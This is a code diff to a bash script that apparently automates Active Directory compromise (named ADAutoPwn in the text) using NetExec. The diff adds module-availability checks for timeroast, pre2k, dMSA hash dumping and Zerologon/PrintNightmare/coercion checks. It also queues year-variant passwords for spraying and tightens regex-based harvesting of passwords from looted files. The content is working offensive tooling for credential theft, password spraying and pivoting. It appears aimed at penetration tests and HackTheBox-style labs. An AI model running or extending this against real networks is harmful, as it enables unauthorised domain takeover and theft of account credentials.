@@ -205,6 +205,11 @@ NXC="$(command -v nxc || command -v netexec || true)"
 die() { err "$1"; exit 1; }
 script_dir() { cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd; }
 external_tool() { local p; p="$(script_dir)/external/$1"; [[ -e "$p" ]] && printf '%s\n' "$p"; }
+nxc_has_module() {  # nxc_has_module <proto> <module>
+    local proto="$1" mod="$2" cache="${OUTDIR:-/tmp}/.nxc_${proto}_modules.txt"
+    [[ -s "$cache" ]] || $NXC "$proto" -L >"$cache" 2>/dev/null || true
+    grep -qE "^[[:space:]]*\\[\\*\\][[:space:]]+${mod}[[:space:]]" "$cache" 2>/dev/null
+}
 
 SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)
 
@@ -316,6 +321,12 @@ add_secret() {
         local v
         while IFS= read -r v; do
             [[ -z "$v" || "$v" == "$p" ]] && continue
+            if [[ -z "${FOUND_SECRETS[$v]:-}" ]]; then
+                FOUND_SECRETS["$v"]=1
+                echo "$v" >>"$OUTDIR/found_passwords.txt"
+                printf '%-30s  ⟵  year variant of %s\n' "$v" "$src" >>"$OUTDIR/credential_map.txt"
+                loot "Year-variant password candidate queued for spray → ${C_GREEN}$v${C_RESET}"
+            fi
             grep -qxF -- "$v" "$DOMAIN_WL" 2>/dev/null || echo "$v" >>"$DOMAIN_WL"
         done < <(year_variants "$p")
     fi
@@ -696,11 +707,13 @@ phase_timeroast() {
     # Opportunistic by design: recent NetExec builds include a timeroast module.
     # If the module is missing or the DC does not answer MS-SNTP requests, this
     # phase simply records no hashes and the engine keeps pivoting normally.
-    if [[ -n "$NXC" ]]; then
+    if [[ -n "$NXC" ]] && nxc_has_module smb timeroast; then
         subsection "NetExec timeroast module"
         run "$NXC smb $DC_IP -u '' -p '' -M timeroast"
         $NXC smb "$DC_IP" -u '' -p '' -M timeroast 2>&1 | tee -a "$LOGFILE" \
             | grep -E '(\$sntp-ms\$|\$krb5pa\$|\$krb5tgs\$|\$krb5asrep\$)' >>"$outf"
+    else
+        info "NetExec timeroast module not available in this install → skipping"
     fi
 
     if [[ -s "$outf" ]]; then
@@ -941,6 +954,23 @@ phase_precreated_computers() {
     PRECREATED_DONE=1
 
     section "PRE-CREATED COMPUTER ACCOUNTS · default-password pivot"
+    local args; mapfile -t args < <(nxc_cred_args)
+    if nxc_has_module ldap pre2k; then
+        subsection "NetExec pre2k module"
+        local pre="$OUTDIR/precreated_computers_nxc.txt"
+        run "$NXC ldap $DCT ${args[*]} -M pre2k"
+        $NXC ldap "$DCT" "${args[@]}" -M pre2k 2>&1 | tee -a "$LOGFILE" | tee "$pre"
+        if grep -qiE 'TGT|ccache|password|sAMAccountName|pre-created|pre2k' "$pre"; then
+            loot "Pre-created computer account results → precreated_computers_nxc.txt"
+            grep -oiP '(?:Account|User|sAMAccountName)\s*[:=]\s*\K\S+\$?' "$pre" 2>/dev/null | sort -u |
+            while IFS= read -r acc; do
+                [[ -z "$acc" || "$acc" != *\$ ]] && continue
+                note_cred_source "$acc" "NetExec pre2k module"
+            done
+        fi
+        return
+    fi
+
     local base="dc=${DOMAIN//./,dc=}" raw="$OUTDIR/precreated_computers_ldap.txt" cand="$OUTDIR/precreated_computers.txt"
     : >"$raw"; : >"$cand"
 
@@ -1151,22 +1181,24 @@ phase_cve_checks() {
     else args=(-u '' -p ''); fi
 
     local out="$OUTDIR/cve_checks_${mode}.txt"; : >"$out"
-    local modules=(zerologon nopac printnightmare petitpotam dfscoerce spooler)
+    local modules=(zerologon printnightmare spooler coerce_plus)
     local m
     for m in "${modules[@]}"; do
+        if ! nxc_has_module smb "$m"; then
+            info "NetExec SMB module '$m' not available → skipping"
+            continue
+        fi
         subsection "NetExec module: $m"
         run "$NXC smb $DCT ${args[*]} -M $m"
         $NXC smb "$DCT" "${args[@]}" -M "$m" 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
     done
 
-    if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|NoPAC|Zerologon|PrintNightmare' "$out" 2>/dev/null; then
+    if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|Zerologon|PrintNightmare|Spooler service enabled' "$out" 2>/dev/null; then
         loot "Potential AD CVE/coercion finding(s) → $(basename "$out")"
         if grep -qiE 'zerologon|CVE-2020-1472' "$out" 2>/dev/null; then
             warn "Zerologon exploitation resets the DC machine password; ADAutoPwn only checks it automatically."
         fi
-        if grep -qiE 'nopac|CVE-2021-42278|CVE-2021-42287' "$out" 2>/dev/null; then
-            warn "NoPAC likely needs a dedicated exploit chain; use --abuse only after confirming tool support and rollback plan."
-        fi
+        [[ "$DO_ABUSE" == "1" ]] && info "NoPAC is handled by the external noPac wrapper, not the noisy NetExec module"
     else
         info "No positive CVE module result (or modules unavailable in this NetExec build)"
         rm -f "$out"
@@ -1483,6 +1515,10 @@ phase_secrets() {
     done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')
 
     subsection "dMSA — delegated Managed Service Account hashes (opportunistic)"
+    if ! nxc_has_module ldap dmsa; then
+        info "NetExec dMSA module not available in this install → LDAP surface enum only"
+        return
+    fi
     run "$NXC ldap $DCT ${args[*]} -M dmsa"
     local dmsa; dmsa=$($NXC ldap "$DCT" "${args[@]}" -M dmsa 2>&1); echo "$dmsa" | tee -a "$LOGFILE" | tee "$OUTDIR/dmsa.txt"
     while IFS= read -r line; do
@@ -2725,6 +2761,10 @@ _plausible_secret() {
     # a var named `s`. That silently broke DPAPI ingestion (caller var was `p`).
     local s="$1"; local n=${#s}
     (( n < 6 || n > 40 )) && return 1
+    [[ "$s" =~ \.(txt|json|log|csv|zip|ccache|htb|local|lan|com|net|org)$ ]] && return 1       # files/hostnames/domains
+    [[ "$s" =~ ^[A-Za-z0-9._-]+\.[A-Za-z0-9._-]+\.[A-Za-z]{2,}$ ]] && return 1                # fqdn
+    [[ "$s" =~ ^[A-Za-z]{6,12}$ ]] && return 1                                                # weak word fragments
+    [[ "$s" =~ ^[A-Z]{6,12}$ ]] && return 1                                                    # all-caps fragments
     [[ "$s" =~ ^\{?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}?$ ]] && return 1   # GUID
     [[ "$s" =~ ^0[xX][0-9a-fA-F]+$ ]] && return 1                                          # hex literal
     [[ "$s" =~ ^[0-9a-fA-F]{16,}$ ]] && return 1                                           # long pure hex
@@ -2777,12 +2817,17 @@ harvest_secrets() {
         add_secret "$p" "harvested pair (user $u) from $label"
         note_cred_source "${u}:${p}" "harvested cred pair from $label"
         queue_cred "$u" "$p" "" "harvested cred pair from $label"
+        while IFS= read -r vp; do
+            [[ -z "$vp" || "$vp" == "$p" ]] && continue
+            note_cred_source "${u}:${vp}" "year variant of harvested cred pair from $label"
+            queue_cred "$u" "$vp" "" "year variant of harvested cred pair"
+        done < <(year_variants "$p")
         added=$((added+1))
     done < <(printf '%s\n' "$text" | grep -iE 'user|login|logon|account|acct|pass|pwd|secret|credential|principal|://|(^|[[:space:]])-[uUpP]([[:space:]]|$)' 2>/dev/null)
 
     # (1) "password/pwd/reset to/set to/secret : X"  →  X
     while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
-        printf '%s\n' "$text" | grep -oiP '(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
+        printf '%s\n' "$text" | grep -oiP '\b(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\b\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
     # (2) standalone strong tokens (capped to avoid lockout-spray noise)
     while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
         printf '%s\n' "$text" | grep -oP '\b(?=[A-Za-z0-9!@#$%^&*._-]*[A-Z])(?=[A-Za-z0-9!@#$%^&*._-]*[a-z])(?=[A-Za-z0-9!@#$%^&*._-]*[0-9])[A-Za-z0-9!@#$%^&*._-]{8,40}\b' | sort -u | head -8 )
@@ -2790,7 +2835,7 @@ harvest_secrets() {
     for s in "${hits[@]}"; do
         # filter obvious non-secrets
         [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
-        [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol)$ ]] && continue
+        [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol|log|htb|local)$ ]] && continue
         _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
         if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
             loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
@@ -4837,8 +4882,12 @@ main() {
     # --- Self-feed: resume context + ingest anything the operator found manually ---
     # Resume recovered passwords if reusing an existing loot dir
     if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
-        while IFS= read -r p; do [[ -n "$p" ]] && FOUND_SECRETS["$p"]=1; done <"$OUTDIR/found_passwords.txt"
-        info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") previously recovered passwords"
+        local _resume_pw; _resume_pw="$(mktemp)"
+        sort -u "$OUTDIR/found_passwords.txt" >"$_resume_pw"
+        : >"$OUTDIR/found_passwords.txt"
+        while IFS= read -r p; do [[ -n "$p" ]] && add_secret "$p" "resumed from previous loot"; done <"$_resume_pw"
+        rm -f "$_resume_pw"
+        info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") recovered password candidate(s)"
     fi
     # Resume: don't re-pwn identities already compromised on this loot dir. Loading
     # them into SEEN_CREDS makes process_queue skip them, so re-running (e.g. with
